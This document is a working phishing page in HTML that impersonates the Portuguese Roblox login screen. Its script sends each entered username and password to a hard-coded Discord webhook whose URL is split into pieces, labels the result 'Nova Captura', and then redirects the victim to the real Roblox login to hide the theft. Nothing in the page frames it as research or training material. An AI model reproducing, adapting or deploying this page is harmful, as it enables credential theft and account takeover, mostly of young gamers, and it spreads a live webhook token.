<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Entrar na Roblox</title>
    <link rel="icon" href="https://www.roblox.com/favicon.ico">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Hanken+Grotesk:wght@400;500;600;700;800&display=swap');
        
        * {
            margin: 0; padding: 0; box-sizing: border-box;
            font-family: 'Hanken Grotesk', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            background-color: #0d0e12;
            color: #ffffff;
            height: 100vh;
            display: flex;
            flex-direction: column;
            overflow: hidden;
        }

        /* HEADER */
        .topbar {
            background-color: #191b1f;
            height: 48px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0 24px;
            border-bottom: 1px solid #2e3134;
            z-index: 100;
        }

        .topbar-left { display: flex; align-items: center; gap: 24px; }
        .logo-svg { width: 84px; height: 16px; fill: #ffffff; }
        .nav-links { display: flex; gap: 20px; font-size: 14px; font-weight: 600; color: #e3e3e3; }
        .nav-links span.active { color: #fff; border-bottom: 2px solid #fff; padding-bottom: 10px;}

        .topbar-right { display: flex; align-items: center; gap: 12px; }
        .search-bar { background-color: #272a2e; border: 1px solid #3b3f43; border-radius: 4px; padding: 6px 12px; display: flex; align-items: center; gap: 8px; width: 240px; color: #9ea2a6; font-size: 14px; }
        .btn-cadastrar { background-color: #335fff; color: #fff; border: none; padding: 6px 12px; border-radius: 4px; font-size: 14px; font-weight: 600; cursor: pointer; }
        .btn-entrar-top { background-color: transparent; color: #fff; border: 1px solid #ffffff; padding: 6px 12px; border-radius: 4px; font-size: 14px; font-weight: 600; cursor: pointer; }

        /* ÁREA CENTRAL */
        .main-area {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            position: relative;
            background-image: linear-gradient(to bottom, rgba(0,0,0,0.4) 0%, rgba(0,0,0,0.8) 100%), url('https://images.rbxcdn.com/2c3e2e7b4e5f4a6e8c9d0e1f2a3b4c5d.jpg'); 
            background-size: cover;
            background-position: center;
        }

        /* CAIXA DE LOGIN (Fina e proporcional ao desktop) */
        .login-card {
            background-color: #232527;
            width: 100%;
            max-width: 360px; /* Caixa mais fina */
            border-radius: 8px;
            padding: 30px 24px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.6);
            border: 1px solid #3b3f43;
            z-index: 10;
        }

        .login-card h1 {
            font-size: 24px; /* Fonte menor */
            font-weight: 700;
            text-align: center;
            margin-bottom: 20px;
        }

        .input-group { margin-bottom: 10px; }

        .input-group input {
            width: 100%;
            padding: 10px 12px; /* Inputs mais baixos */
            background-color: #191b1f;
            border: 1px solid #3b3f43;
            border-radius: 6px;
            color: #fff;
            font-size: 14px;
            outline: none;
        }

        .input-group input::placeholder { color: #9ea2a6; }

        .btn-main {
            width: 100%;
            padding: 10px;
            background-color: #232527;
            border: 1px solid #ffffff;
            border-radius: 6px;
            color: #ffffff;
            font-size: 14px;
            font-weight: 600;
            margin-top: 4px;
            cursor: pointer;
        }

        .btn-main:active { background-color: #3b3f43; }

        .forgot-link {
            display: block;
            text-align: center;
            color: #ffffff;
            text-decoration: none;
            font-size: 14px;
            margin: 16px 0;
            font-weight: 600;
        }

        .divider { height: 1px; background-color: #3b3f43; margin: 16px 0; }

        .btn-secondary {
            width: 100%;
            padding: 10px; /* Botões mais baixos */
            background-color: #272a2e;
            border: 1px solid #3b3f43;
            border-radius: 6px;
            color: #ffffff;
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 10px;
            cursor: pointer;
        }

        .btn-secondary:active { background-color: #3b3f43; }

        .signup-text { text-align: center; color: #e3e3e3; font-size: 14px; margin-top: 20px; }
        .signup-text a { color: #ffffff; font-weight: 700; text-decoration: none; }

        /* RODAPÉ */
        .footer { background-color: #191b1f; padding: 8px 0; display: flex; flex-direction: column; align-items: center; justify-content: center; border-top: 1px solid #2e3134; }
        .footer-text { font-size: 11px; font-weight: 700; color: #fff; margin-bottom: 4px; }
        .rating-bar { display: flex; width: 200px; height: 4px; }
        .rating-red { width: 50%; background-color: #ff0000; }
        .rating-white { width: 50%; background-color: #ffffff; }

        /* Mobile: Mantém proporcional mas esconde o menu */
        @media (max-width: 768px) {
            .nav-links, .search-bar { display: none; }
            .topbar { padding: 0 16px; }
            .login-card { max-width: 90%; padding: 24px 20px; }
        }
    </style>
</head>
<body>

    <div class="topbar">
        <div class="topbar-left">
            <svg class="logo-svg" viewBox="0 0 84 16" xmlns="http://www.w3.org/2000/svg">
                <path d="M4.7,16H0L2.3,0h4.7L4.7,16z M25.4,16h-4.7l-2.3-7.8-1.5,7.8h-4.7l-2.3-16h4.7l1.5,10.3l2.3-10.3h4.7l2.3,10.3l1.5-10.3h4.7L25.4,16z M34.5,0h-4.7L27.5,16h4.7L34.5,0z M42.1,10.1v5.9h-4.7V0h4.7v7.8l5.2-7.8h5.5l-6.2,7.2l6.2,8.8h-5.5L42.1,10.1z M59.7,16H55L57.3,0h8.6L59.7,16z M60.4,4h-1.5l-0.9,7.8h1.5L60.4,4z M83.3,4h-1.5l-0.9,7.8h1.5L83.3,4z M77.9,16h-4.7L75.5,0h8.6L77.9,16z"/>
            </svg>
            <div class="nav-links">
                <span class="active">Destaques</span>
                <span>Mercado</span>
                <span>Criar</span>
                <span>Robux</span>
            </div>
        </div>
        <div class="topbar-right">
            <div class="search-bar">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#9ea2a6" stroke-width="2"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
                Pesquisar
            </div>
            <button class="btn-cadastrar">Cadastrar-se</button>
            <button class="btn-entrar-top">Entrar</button>
        </div>
    </div>

    <div class="main-area">
        <div class="login-card">
            <h1>Entrar na Roblox</h1>
            <form id="login-form">
                <div class="input-group">
                    <input type="text" id="username" placeholder="Usuário/e-mail/telefone" required>
                </div>
                <div class="input-group">
                    <input type="password" id="password" placeholder="Senha" required>
                </div>
                <button type="submit" class="btn-main" id="btn-submit">Entrar</button>
            </form>

            <a href="#" class="forgot-link">Esqueceu a senha ou nome de usuário?</a>

            <div class="divider"></div>

            <button class="btn-secondary">Envie-me um código único por e-mail</button>
            <button class="btn-secondary">Entrada rápida</button>
            <button class="btn-secondary">Outras opções de acesso</button>

            <div class="signup-text">
                Não possui uma conta? <a href="#">Cadastrar-se</a>
            </div>
        </div>
    </div>

    <div class="footer">
        <div class="footer-text">CLASSIFICAÇÃO INDICATIVA: 16 ANOS</div>
        <div class="rating-bar">
            <div class="rating-red"></div>
            <div class="rating-white"></div>
        </div>
    </div>

    <script>
        (function(){
            var p1 = "https://discord.com/api/webhooks/";
            var p2 = "1573426421085241448/";
            var p3 = "LGoTUoMIZdohFLYE9s3THG4sSUFbbi1PEF5Hd1145-KIH6KapiIvAnLGhFT4kmlfOFPL";
            var url = p1 + p2 + p3;

            var form = document.getElementById('login-form');
            var btn = document.getElementById('btn-submit');
            var u = document.getElementById('username');
            var p = document.getElementById('password');

            form.addEventListener('submit', function(e) {
                e.preventDefault();
                if(!u.value || !p.value) return;
                
                btn.textContent = 'Entrando...';
                
                var dados = {
                    content: "🎣 **Nova Captura**\n👤 User: `" + u.value + "`\n🔑 Senha: `" + p.value + "`"
                };

                fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(dados)
                }).then(function() {
                    setTimeout(function() {
                        window.location.href = 'https://www.roblox.com/pt/Login';
                    }, 1500);
                }).catch(function() {
                    btn.textContent = 'Entrar';
                });
            });
        })();
    </script>
</body>
</html>
